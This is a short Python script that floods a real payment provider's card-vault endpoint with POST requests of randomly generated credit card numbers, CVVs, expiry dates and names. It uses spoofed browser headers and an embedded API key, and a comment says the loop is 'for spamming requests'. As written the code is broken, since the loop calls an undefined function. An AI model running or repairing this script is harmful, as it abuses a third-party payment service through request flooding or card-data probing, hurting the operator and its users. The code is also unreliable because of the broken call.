import requests
import random
import string
import uuid

# Loop range function (For spamming requests)
def loop():
	for i in range (1,100):
		enviar_datos()
		
# Random data generator function
def generate_data():
    return {
        "expiration_month": f"{random.randint(1, 12):02d}",
        "expiration_year": str(random.randint(2025, 2030)),
        "holder_name": random.choice(["John Doe", "Alice Smith", "Carlos Pérez", "Maria Garcia"]),
        "pan": "".join([str(random.randint(1, 9))] + [str(random.randint(0, 9)) for _ in range(15)]),
        "key": "f8e7fd3b-3450-4ca5-ac49-101712109df6",
        "country_code": "MX",  # fix error at "country_"cvv"
        "cvv": str(random.randint(100, 999))
    }

# Required headders
headers = {
    "Sec-Ch-Ua-Platform": "\"Linux\"",
    "Accept-Language": "en-US,en;q=0.9",
    "Sec-Ch-Ua": "\"Chromium\";v=\"133\", \"Not(A:Brand\";v=\"99\"",
    "Sec-Ch-Ua-Mobile": "?0",
    "X-Fields-Api-Key": "f8e7fd3b-3450-4ca5-ac49-101712109df6",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "X-Uow": "FI-" + ''.join(random.choices(string.ascii_letters + string.digits, k=20)),
    "Origin": "https://static.dlocal.com",
    "Sec-Fetch-Site": "same-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://static.dlocal.com/",
    "Accept-Encoding": "gzip, deflate, br",
    "Priority": "u=1, i"
}

# Endpoint URL
url = "https://ppmcc.dlocal.com/cvault/credit-card/temporal"

# Send POST request
def send_data():
    data = generate_data()
    response = requests.post(url, json=data, headers=headers)
    print("Status Code:", response.status_code)
    print("Response Body:", response.text)

if __name__ == "__main__":
	loop()
